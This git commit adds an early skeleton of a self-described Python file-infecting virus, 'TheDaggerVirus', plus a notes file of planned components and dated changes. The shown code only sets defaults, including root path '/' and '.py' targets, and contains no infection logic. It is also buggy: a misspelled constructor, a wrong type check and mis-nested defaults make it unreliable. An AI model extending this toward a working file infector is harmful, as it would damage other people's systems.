b793b7ac97cf265ed8d029d57c518c89106b9edf
Mr. David <dbishop4880@outlook.com>
2024-12-12 15:30:29 -0500

    Add files via upload

---
+++ TheDaggerVirus/main.py
@@ -0,0 +1,23 @@
+#version 0.1.1 (first version of The Dagger Virus)
+class Virus:
+    def __init_(self, infect_string=None, path=None,   \
+                        extension=None, target_file_list=None):
+        if isinstance(infect_string, type(type)):
+            self.infect_string="I am TheDaggerVirus"
+        else:
+            self.infect_string = infect_string
+
+        if isinstance(path, type(None)):
+            self.path = "/"
+        else:
+            self.path = path
+
+            if isinstance(extension, type (None)):
+                self.extension = ".py"
+            else:
+                self.extension = extension
+
+                if isinstance(target_file_list, type(None)):
+                    self.target_file_list =[]
+                else:
+                    self.target_file_list = target_file_list
---
+++ TheDaggerVirus/notes.py
@@ -0,0 +1,8 @@
+#main.py: main scripting of the Virus
+#notes.py: taking notes of all testing and description of main.py scripts
+#run.java: extra runner scripts & applications for the Virus
+#testing.java: for all extra tests for java stuff
+
+#12/12/2024 - Made v0.1 into 0.1.0, and afterwards did 0.1.1
+#12/12/2024 - Reset everything with the virus to scratch
+#12/12/2024 - _
